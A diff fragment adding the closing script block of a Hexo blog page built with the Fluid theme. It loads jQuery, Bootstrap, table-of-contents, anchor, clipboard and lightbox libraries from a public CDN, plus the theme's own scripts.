+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
